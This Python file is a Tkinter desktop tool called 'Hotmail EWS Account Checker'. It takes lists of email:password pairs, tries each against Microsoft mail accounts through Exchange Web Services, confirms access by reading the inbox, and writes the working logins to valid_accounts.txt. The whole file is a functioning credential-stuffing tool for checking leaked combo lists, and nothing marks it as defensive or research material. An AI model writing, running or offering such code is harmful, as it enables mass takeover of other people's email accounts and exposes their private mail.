import tkinter as tk
from tkinter import filedialog, messagebox, ttk, scrolledtext
import threading
import webbrowser
from exchangelib import Credentials, Account, DELEGATE

# Function to check Hotmail login via EWS
def check_hotmail_login(email, password):
    try:
        creds = Credentials(email, password)
        account = Account(email, credentials=creds, autodiscover=True, access_type=DELEGATE)
        
        # If we can access the inbox, login is successful
        account.inbox.all().count()
        return True  # Login successful
    except Exception as e:
        return False  # Login failed

# Function to process uploaded file
def upload_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return
    progress_label.config(text="Processing file...")
    threading.Thread(target=process_file, args=(file_path,)).start()  # Run in a separate thread

# Function to process account credentials
def process_file(file_path):
    output_file = 'valid_accounts.txt'
    failed_file = 'failed_accounts.txt'

    with open(file_path, 'r') as f:
        accounts = [line.strip().split(':') for line in f.readlines()]

    valid_accounts = []
    failed_accounts = []
    total = len(accounts)

    for index, account in enumerate(accounts, start=1):
        if len(account) != 2:
            progress_text.insert(tk.END, f"⚠️ Skipping invalid format: {account}\n")
            continue

        email, password = account
        progress_label.config(text=f'Checking {index}/{total}: {email}...')
        root.update_idletasks()

        if check_hotmail_login(email, password):
            valid_accounts.append(f'{email}:{password}')
            progress_text.insert(tk.END, f"{email} ✅ Success\n")
        else:
            failed_accounts.append(f'{email}:{password}')
            progress_text.insert(tk.END, f"{email} ❌ Failed\n")

        progress_text.see(tk.END)

    # Save valid and failed accounts to file
    with open(output_file, 'w') as f:
        f.write('\n'.join(valid_accounts))
    with open(failed_file, 'w') as f:
        f.write('\n'.join(failed_accounts))

    progress_label.config(text=f'✅ Done! {len(valid_accounts)} valid, {len(failed_accounts)} failed.')
    messagebox.showinfo("Process Complete", "Account checking is done! Check valid_accounts.txt and failed_accounts.txt")

# Function to paste accounts manually
def paste_accounts():
    input_text = input_box.get("1.0", tk.END).strip()
    if not input_text:
        messagebox.showwarning("No Input", "Please enter email:password list.")
        return

    # Write pasted accounts to a temporary file and process
    with open("temp_accounts.txt", "w") as temp_file:
        temp_file.write(input_text)

    progress_label.config(text="Processing pasted accounts...")
    threading.Thread(target=process_file, args=("temp_accounts.txt",)).start()

# Function to open valid accounts file
def open_valid_accounts():
    try:
        webbrowser.open("valid_accounts.txt")  # Opens in default text editor
    except Exception as e:
        messagebox.showerror("Error", f"Could not open file: {e}")

# Create GUI
def create_gui():
    global root, progress_label, progress_text, input_box
    root = tk.Tk()
    root.title("Hotmail EWS Account Checker")
    root.geometry("600x500")

    label = tk.Label(root, text="Upload or Paste Accounts (email:password)", font=("Arial", 12))
    label.pack(pady=5)

    # Buttons for upload and paste
    frame = tk.Frame(root)
    frame.pack()

    upload_button = tk.Button(frame, text="📂 Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(side=tk.LEFT, padx=10)

    paste_button = tk.Button(frame, text="✂️ Paste Accounts", command=paste_accounts, font=("Arial", 10), bg="lightgreen")
    paste_button.pack(side=tk.LEFT, padx=10)

    # Text box for copy-paste input
    input_box = scrolledtext.ScrolledText(root, height=5, width=60)
    input_box.pack(pady=5)

    # Progress output
    progress_label = tk.Label(root, text="", font=("Arial", 10))
    progress_label.pack(pady=5)

    progress_text = scrolledtext.ScrolledText(root, height=12, width=70)
    progress_text.pack(pady=5)

    # Button to open valid accounts
    open_valid_button = tk.Button(root, text="📜 View Successful Logins", command=open_valid_accounts, font=("Arial", 10), bg="lightyellow")
    open_valid_button.pack(pady=5)

    root.mainloop()

# Start GUI
create_gui()
